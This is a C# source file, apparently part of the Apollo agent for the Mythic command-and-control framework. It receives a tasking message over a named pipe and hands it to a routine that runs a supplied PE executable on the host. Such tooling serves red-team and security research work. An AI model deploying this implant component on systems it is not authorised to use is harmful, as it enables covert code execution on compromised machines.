using System;
using System.Collections.Generic;
using System.Text;
using System.Linq;
using System.Threading;
using ApolloInterop.Serializers;
using System.Collections.Concurrent;
using ApolloInterop.Interfaces;
using ApolloInterop.Classes;
using ApolloInterop.Classes.Core;
using ApolloInterop.Structs.ApolloStructs;
using ApolloInterop.Classes.Events;
using ApolloInterop.Enums.ApolloEnums;
using ApolloInterop.Constants;

namespace ExecutePE
{
    internal static class Program
    {
        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private static string? _namedPipeName;
        private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private static AsyncNamedPipeServer? _server;
        private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
        private static ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>> MessageStore = new ConcurrentDictionary<string, ChunkedMessageStore<IPCChunkedData>>();


        private static int Main(string[] args)
        {
            if (args.Length != 1)
            {
                throw new Exception("No named pipe name given.");
            }
            _namedPipeName = args[0];

            _server = new AsyncNamedPipeServer(_namedPipeName, instances: 1, BUF_OUT: IPC.SEND_SIZE, BUF_IN: IPC.RECV_SIZE);
            _server.MessageReceived += OnAsyncMessageReceived;

            try
            {
                if (IntPtr.Size != 8)
                {
                    throw new InvalidOperationException("Application architecture is not 64 bits");
                }

                _receiverEvent.WaitOne();
                _server.Stop();

                IMythicMessage taskMsg;

                if (!_recieverQueue.TryDequeue(out taskMsg))
                {
                    throw new InvalidOperationException("Could not get tasking from Mythic");
                }

                if (taskMsg.GetTypeCode() != MessageType.ExecutePEIPCMessage)
                {
                    throw new Exception($"Got invalid message type. Wanted {MessageType.ExecutePEIPCMessage}, got {taskMsg.GetTypeCode()}");
                }

                ExecutePEIPCMessage peMessage = (ExecutePEIPCMessage)taskMsg;
                PERunner.RunPE(peMessage);
                return 0;
            }
            catch (Exception exc)
            {
                Console.WriteLine(exc.ToString());
                return exc.HResult;
            }
        }

        private static void OnAsyncMessageReceived(object sender, NamedPipeMessageArgs args)
        {
            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
            lock (MessageStore)
            {
                if (!MessageStore.ContainsKey(chunkedData.ID))
                {
                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                }
            }
            MessageStore[chunkedData.ID].AddMessage(chunkedData);
        }

        private static void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
            MessageType mt = args.Chunks[0].Message;
            List<byte> data = new List<byte>();

            for (int i = 0; i < args.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
            }

            IMythicMessage msg = _jsonSerializer.DeserializeIPCMessage(data.ToArray(), mt);
            //Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Enqueue(msg);
            _receiverEvent.Set();
        }
    }
}
